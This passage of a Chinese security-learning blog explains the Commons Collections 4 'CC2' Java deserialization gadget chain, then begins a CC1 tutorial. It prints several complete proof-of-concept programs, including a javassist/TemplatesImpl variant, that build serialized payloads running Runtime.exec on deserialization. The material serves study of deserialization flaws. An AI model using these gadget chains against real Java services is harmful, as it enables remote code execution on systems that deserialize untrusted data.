heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。\n因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会更具元素的排序顺序决定出堆的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。\n在CC2中，我们就是要利用到PriorityQueue类，来看这个类重写的readObject()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); heapify(); } 这里将数据反序列化到queue中后，会调用heapify()方法来对数据进行排序。跟进一下heapify()方法： heapify()方法会调用siftDown()，继续跟进：\n当comparator不为 null 的时候，就会调用siftDownUsingComparator()方法：\n在 siftDownUsingComparator() 方法中，会调用 comparator 的 compare() 方法来进行优先级的比较和排序。\n这样，反序列化之后的优先级队列，也拥有了顺序。\nTransformingComparator TransformingComparator 是触发漏洞的关键，他将 Transformer 执行点和 PriorityQueue 触发点联系了起来。这个类位于org.apache.commons.collections4.comparators.TransformingComparator。\n既然这里都说到了联系了起来，在PriorityQueue 类的最后说到了 compare() 方法，那么我们来看一下TransformingComparator 的compare()方法： 这里就调用到了transform 方法，通过的是this.transformer对象，来看一下TransformingComparator的构造方法： 如果初始化的时候不指定 Comparator，则使用这个类直接定义的的 ComparableComparator.comparableComparator()，也就是第一个构造方法，并且我们就是要利用第一个构造方法。\n这里可以看到正好这个this.transformer变量是我们要求的Transformer类型。这样我们就传入基本盘的链子实现漏洞利用。\n链子大概出来了，现在就是来构造。\n攻击构造 还是给个代码来调试，结合前面的大概链子的说明，这里需要给出PriorityQueue实例和TransformingComparator实例，还是简单给出一个代码来调试。来看一下我们要利用到的PriorityQueue类的构造方法： 这里的initialCapacity不能小于1。\n结合前面的描述，我们需要将这里的this.comparator设置为TransformingComparator类的实例。\n那么就可以尝试构造一下代码了：\nfake:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(1,comparator1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 在调试过程中，直接在heapify()就结束了，并没有进入for循环： 个人想法：这是因为PriorityQueue被初始化的时候只有一个元素空间，但是没有实际添加任何元素，所以我们需要调用PriorityQueue的add方法来向对象添加元素\n疑问一 这里就有个小疑问了，初始化了一个元素空间，这是什么，我们看之前给出的利用到的PriorityQueue类的构造方法： 并且我们在初始化的时候确实是只传了一个1进去。现在来分析一下这个构造方法，我们看这一块： 这里是创建了一个下标为initialCapacity的Object数组并赋值给了this.queue，所以在这里initialCapacity的值代表了这个数组能容纳多少个值。\n那么现在来看一下add方法： 这个add方法实际调用的是offer()方法，来分析一下offer()方法的源码：\n这里用到了size变量，定义如下： 继续分析offer()方法：\n当第一次调用add，即第一次进入offer方法，此时会将i设置为size定义的0，然后由于i\u0026lt;我们初始化定义的queue数组长度1，所以不会进入第一个if条件\n然后继续，此时就会size赋值i+1，导致size的值变成1。\n然后由于第一次进入，此时的i为0，就会进入第二个if条件，这样就会将我们定义得queue数组的第一个值定义为我们add进的比如10。\n这样就完成了数组的赋值。\n那么如果我们类初始化时传入的是2呢？定义了“两个容量”的数组，然后在第二次put时会发生什么？（假设我们第二次还是add进10）\n这样i就是1，第一个if条件同样不会进入\nsize的值变成2\n第二个if条件不会进入，会调用siftUp方法，那么此时的i为1，x为10，看一下源码：\n类初始化的时候我们定义了comparator变量，继续跟进siftUpUsingComparator方法：\n这里自然会进入while循环，并且会调用comparator的compare()方法来比较（稍微看一下可以知道就是在给数组第二个赋值，所以基本可以肯定我们初始化时传进去的int值就是用来确定可以add进几个元素了）。\n————\n这里我想到了一个东西，由于我们传入的compare变量为TransformingComparator，那么是否可以认为只要我们正确传入链子，这里应该是可以成功弹出计算机的，测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(10); priority.add(10); } } 成功按照预期弹出两个计算机，这是因为TransformingComparator的compare用了两次transformer方法：\n那么为了避免这个序列化时弹计算机问题，我们就使用之前说过的先假再反射更改为真的就行了。\n想法结束，可行\n————\n继续分析siftUpUsingComparator代码，现在就跟进一下那个if条件，在我们进入到TransformingComparator的compare后，如上图源码。就算在上面传入真的利用链，最后返回的都是1，所以无论我们add进什么值，最后这里比较的value1和value2都是1，然后调用decorate.compare()方法，可以直接用上面的代码调试，然后到ComparableComparator类的compare()：\n然后就直接返回到TransformingComparator的compare()方法==》直接退回到add()了，不知道这个compareTo的结果是什么，但是可以加断点看结果： 可以知道最后的compareTo的结果是true，导致while循环直接结束，然后就直接给queue[1] = 10了。结合我前面说的，由于我们构造的链子，会导致compareTo比较的值会都是1，直接返回true，所以其实这里的siftUpUsingComparator()我们可以看作是直接给对应的下标k赋值为x即可。\n——————\noffer()方法分析结束，但是我此时想到了PriorityQueue的readObject()方法： 前面给过size变量的定义了，可以看出size的值是可以被序列化的，并且从上面的过程可以看出size的值是和我们add进的值个数是相同的。这样基本就可以看懂这里的readObject()方法是在干嘛了。\n疑问解决 现在继续分析heapify()方法： 就是看会不会进入这个for循环，这里的size正好就是我们前面刚说过的，前面的\u0026gt;\u0026gt;\u0026gt;是按位右移补零操作符，当size为0，1时候i都小于0，这里需要满足size≥2，即我们需要add进两个元素。\n那么代码可以改为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 但是这样已经成功在反序列化的时候弹出两个计算机了。\n还是继续跟一下：\n所以此时siftDown的参数分别为0和queue[0]的值，也就是1。\n然后有效点到了siftDownUsingComparator方法\n对应值图里面都有，size就是我们最开始定义的2，剩下的已经很好看懂了，最后就是在第二个if这里成功调用compare()方法从而弹出计算机。\nOK，调用链结束。\n最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } javassist补充 除了前面的POC，还可以利用到javassist来操作，刚好这里要利用到之前在javassist没说过的利用方法，简单说下，直接看代码和结果就行了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.example; import javassist.ClassPool; import javassist.CtClass; public class Haha { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;cat\u0026#34;); String cmd = \u0026#34;System.out.println(\\\u0026#34;static创建成功\\\u0026#34;);\u0026#34;; ctClass.makeClassInitializer().insertBefore(cmd); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.newInstance(); } } 运行后成功在output目录下生成cat.class文件： 并且成功输出static创建成功： ————————\n这里的javassist构造就直接看POC来分析\nPOC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //获取默认的ClassPool ClassPool pool = ClassPool.getDefault(); //向ClassPool容器插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //创建Cat类 CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //就是创建static默认方法 cc.makeClassInitializer().insertBefore(cmd); //生成一个随机的类名，这里使用了当前系统时间的纳秒部分来确保“唯一性” String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //更改类名，但是其实直接用Cat就行，但是用来确保唯一性也是可以的 cc.setName(randomClassName); //cc.writeFile(); //设置cc类的父类 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 对于javassist的操作注释已经说很清楚了，从中给\u0026quot;Cat\u0026quot;类加父类AbstractTranslet就是动态加载字节码里面要求的。\n现在来分析一下其他的代码，将中间的javassist直接理解为一个构造类似Test.class的过程，现在来看其他的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); //直接将InvokerTransformer类实例传给transformer变量 TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //将CtClass对象转换为字节码 byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //这里是正常的能够成功加载字节码的要求 TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 分别看代码： 这一部分就是获取InvokerTransformer的构造方法，然后将一般在加载字节码时需要用到的newTransformer传进去，这里分别在实例化时用到的方法为： InvokerTransformer：\nTransformingComparator就是前面讲过的那个。\nPriorityQueue则是：\n然后继续看：\n这里就是定义了一个数组，为什么是Object[]很好理解，为什么是这个顺序后面会说。\n然后调用反射将queue的值更改为这个数组。\n后续又是反射来更改size值为2，因为我们没有调用add方法，所以不会让size值增加，我们需要改值。\n再后来又是反射修改PriorityQueue的comparator的值为我们的利用链。\n思考一下其实到transform()方法的路线都是一样的，差别就在于这里是直接调用的InvokerTransformer的transform()方法，我们来看一下有些啥特殊之处：\n这里就需要注意这个obj1了，因为InvokerTransformer需要注意传入的值。\n在前面的第一条链子的调试过程中我们很容易可以知道这里的obj1就代表queue[0]里面的templates对象，也就是前面那条链子反序列化时的：\n和\n这样就很清楚了，然后为什么需要前面的是TemplatesImpl类实例，后面的才是其其他值：\n这里主要是因为如果1在前面，那么在调用transform()方法时就会抛出异常然后退出：\n这样就不能达到既定的目的。\n但是如果我们将TemplatesImpl类实例放在前面，那么就会先传入TemplatesImpl，成功完成一次method.invoke()，也就会成功及逆行一次命令执行。虽然同样会报错退出，但是已经达到了既定目的。这也就是需要将TemplatesImpl类实例放在前面的原因。\n那么对于后续的调用的InvokerTransformer类的transform()方法也清楚了： 跟我们之前说的CC3那里异曲同工，还是比较精妙的。\n现在基本就通了，这里就是在动态加载字节码过程中的newInstance()时会触发static代码块，然后弹出计算机。\n所以最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2,Tcomparator); //获取默认的ClassPool ClassPool pool = ClassPool.getDefault(); //向ClassPool容器插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //创建Cat类 CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //就是创建static默认方法 cc.makeClassInitializer().insertBefore(cmd); //生成一个随机的类名，这里使用了当前系统时间的纳秒部分来确保“唯一性” String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //更改类名，但是应该直接用Cat就行了，但是用来确保唯一性也是可以的 cc.setName(randomClassName); //设置cc类的父类 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //cc.writeFile(\u0026#34;output\u0026#34;); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 成功按照预期弹出一个计算机。\n稍微改一点javassist代码就可以得到构造出来的类为： 还有一个点就是为什么在动态加载字节码那里会少一行，这是因为TemplatesImpl类的readObject()方法有定义： 在构造代码时也可以加上，像CC3那样。\n但是我有点小奇怪的就是为啥不用在比如Cat类重写那两个transform()方法，但是无所谓，就算不能用也可以直接使用javassist将transform()方法添加上去即可。\n","date":"2025-01-22T13:37:04+08:00","permalink":"https://fupanc-w1n.github.io/p/cc2/","title":"CC2"},{"content":"CC1 前面说过了URLDNS这条链，现在我们就可以开始学习Common-Collections利用链，这是反序列化学习中不可逃过的一关。\n小的知识点 来补充一下之前一直遇到的一个知识点，JAVA基础，一直在忘记，就是数组问题，这里简单记录一下数组的初始化问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 //第一种 使用数组来表示“一组”int类型,然后再分开赋值即可 int[] ns = new int[5]; ns[0] = 68; ns[1] = 66; ... 可以使用 数组变量.length 获取数组大小 //第二种 定义数组时直接指定初始化的元素，这样就不必写出数组大小，而是由编译器自动推算数组大小。 int[] ns = new int[]{12,23,24,45,45}; //第三种 还可以在第二步基础上进一步简写 int[] ns = {11,22,33,44,55}; //第四种 这里再简单讲讲字符串数组 String[] names = {\u0026#34;haha\u0026#34;,\u0026#34;quke\u0026#34;,\u0026#34;erqieha\u0026#34;}; 暂时需要注意的就是这四个，现在就正式开始学习CC链。\nCommons Collections 前置说明 Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。\nCommons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。\n由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条。\n学习路线：CC1 -\u0026gt; CC6 -\u0026gt; CC3 -\u0026gt; CC5 -\u0026gt; CC7 -\u0026gt; CC2 -\u0026gt; CC4 (其中CC2和CC4是common-collections4的利用链)\n环境搭建 Apache Commons项目需要导入，所以我们在这里需要搭建环境，还是使用maven来导包，修改pom.xml即可，比如我这里要导一个cc3.2.1，加上如下：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 再更新一下项目即可。\n下载并且配置相应源码 因为JDK自带·的包里面有些文件是反编译的.class文件导致我们没法清楚看懂代码，为了方便调试，我们需要将它们转变为.java文件，这就需要我们安装响应的源码。\n下载地址：https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\n先原本jdk目录下的src.zip解压到当前目录，在链接中点击zip下载后解压，在/src/share/classes中找到sun文件，把其复制到原本jdk中src.zip的解压文件。\n最后再在idea中把src文件夹添加到原路径下即可：\n动态代理 主要内容就回去看动态代理笔记的内容，主要就是一个点：当我们调用某个动态代理对象的方法时，都会触发代理类的Invoke方法，并传递对应的内容。\n正式分析 测试环境：\nJDK 8u65 commons-collections 3.2.1 需要了解的类和接口 AbstractMapDecorator 在CC库中提供了一个抽象类org.apache.commons.collections.map.AbstractMapDecorator，这个类是Map的扩展，从名字来看，这是一个基础的装饰器，用来给map提供附加功能，被装饰的map存在该类的属性中，并且将所有的操作都转发给这个map。\n这个类有很多实现类，各个类触发的方式不同，重点关注的是TransformedMap 以及LazyMap。\nTransformedMap org.apache.commons.collections.map.TransformedMap类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer来定义，Transformer 在 TransformedMap 实例化时作为参数传入。可以简单看看这个类的定义：\n这个类继承了一个类和实现了一个接口。再看源码其实可以发现很多方法都实现了transform()方法\n这里给一个示例利用代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static Transformer keyTransformer = new Transformer() { public Object transform(Object input) { int num = (int) input; num += 1; return (Object) num; } }; public static Transformer valueTransformer = new Transformer() { public Object transform(Object input) { String str = input.toString(); return str + \u0026#34;1\u0026#34;; } }; public static void main(String[] args) { HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(1, \u0026#34;a\u0026#34;); System.out.println(\u0026#34;初始化map:\u0026#34; + hashMap); // 创建TransformedMap Map map = TransformedMap.decorate(hashMap, keyTransformer, valueTransformer); map.put(2, \u0026#34;b\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.put(1, \u0026#34;w\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.remove(1); System.out.println(\u0026#34;transformMap:\u0026#34; + map); } } 运行后的输出结果：\n1 2 3 4 初始化map:{1=a} transformMap:{1=a, 3=b1} transformMap:{1=a, 2=w1, 3=b1} transformMap:{2=w1, 3=b1} 其实这里出现这个结果的原因还是和对象相关，可以来调试一下：\n这里首先了解一下匿名类是什么，可以参考这个文章，就是可以实现一个类中包含另外一个类，且不需要提供任何的类名直接实例化。主要是用于在我们需要的时候创建一个对象来执行特定的任务，可以使代码更加简洁。\n重要说明：首先在这串代码使用匿名类实现了Transformer接口，创建了一个对象，代码都使用匿名类实现了Transformer接口，创建了一个临时的类实例（即对象），并将这个类实例赋值给了keyTransformer和valueTransformer并都重写了transform()方法，这个是最重要的。（重要的是看代码，一看就懂了）\n然后开始调试：\n重要看后面的put那部分，第一个就是HashMap类的put方法，就是放入一对键值对，不多说。重点看后面。\n然后调用\n跟进源码：\n即返回一个TransformedMap对象，并且此时的keyTransformer和valueTransformer对应自定义的匿名类。\n然后加断点：\n然后现在来看对应的变量的值：\n重点看值，注意valueTransformer和keyTransformer的值为Test$2..和Test$1..，相互对比到来看，可以很容易看出这种格式就是代表匿名类，而不是一个Test类实例。\n在后续的map.put()中，调用的就是TransformedMap类的put方法：\n然后就会调用transformKey方法，源码如下：\n此时就会调用keyTransformer的transform方法，此时调用的就是匿名类的transform方法，那么就是\nvalueTransformer.transformer()同理。逻辑是这样，并且在调试过程中也同样这这个过程。\n继续看map.put()方法：\n1 return this.getMap().put(key, value); 这个getMap对应TransformedMap的父类AbstractInputCheckedMapDecorator的父类AbstractMapDecorator的getMap()方法，源码为：\n1 2 3 protected Map getMap() { return this.map; } 结合前面的实例化的描述，可以知道这里的map即HashMap类实例，所以这里会再调用HashMap的put方法放入一对修饰后的键值对。\n后面那个同理\n最后会调用HashMasp类的remove方法来去掉一个键值对。\n代码分析结束，对于这一段示例代码就需要理解透彻，了解其中的运行过程与逻辑，后面会有用。\n也就是说当 